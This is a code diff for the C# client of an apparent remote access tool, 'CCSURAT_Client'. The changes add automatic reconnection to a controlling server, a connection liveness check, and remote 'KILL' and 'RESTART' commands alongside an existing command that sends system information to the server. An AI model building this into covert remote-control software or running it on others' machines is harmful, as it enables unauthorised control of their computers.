@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Net.Sockets;
 using System.Threading;
+using System.Windows.Forms;
 
 namespace CCSURAT_Client
 {
@@ -26,7 +27,6 @@ namespace CCSURAT_Client
             SetStatus("Disconnected.");
         }
 
-        // NEED TO MAKE THIS METHOD RE-RUN AFTER CONNECTION LOSS
         public void Start()
         {
             // Attempt TCP listener connection to server.
@@ -62,7 +62,7 @@ namespace CCSURAT_Client
             netStream = client.GetStream();
             try
             {
-                while (netStream.CanRead)
+                while (netStream.CanRead && IsAlive())
                 {
                     byte[] bytes = new byte[1024];
                     string data = null;
@@ -81,6 +81,34 @@ namespace CCSURAT_Client
             {
                 Log("Error recieving command: " + ex.ToString());
             }
+            finally
+            {
+                isConnected = false;
+                Log("Connection lost/closed. Retrying connection...");
+                Start();
+            }
+        }
+
+        // checks if the server is still up and connection is stable
+        private Boolean IsAlive()
+        {
+            try
+            {
+                // write empty buffer to server to check if connection is alive
+                byte[] empty = new byte[1];
+                netStream.Write(empty, 0, 0);
+                return true;
+            }
+            catch (SocketException ex)
+            {
+                // Send buffer is full, but still connected to server.
+                if (ex.NativeErrorCode.Equals(10035))
+                    return true;
+                else
+                {
+                    return false;
+                }
+            }
         }
 
         private void HandleData(string data)
@@ -92,6 +120,12 @@ namespace CCSURAT_Client
                 {
                     case "START":
                         Write("[[START]]" + SystemUtils.SystemInfo() + "[[/START]]");
+                        break;
+                    case "KILL":
+                        Application.Exit();
+                        break;
+                    case "RESTART":
+                        Application.Restart();
                         break;
 
                 }
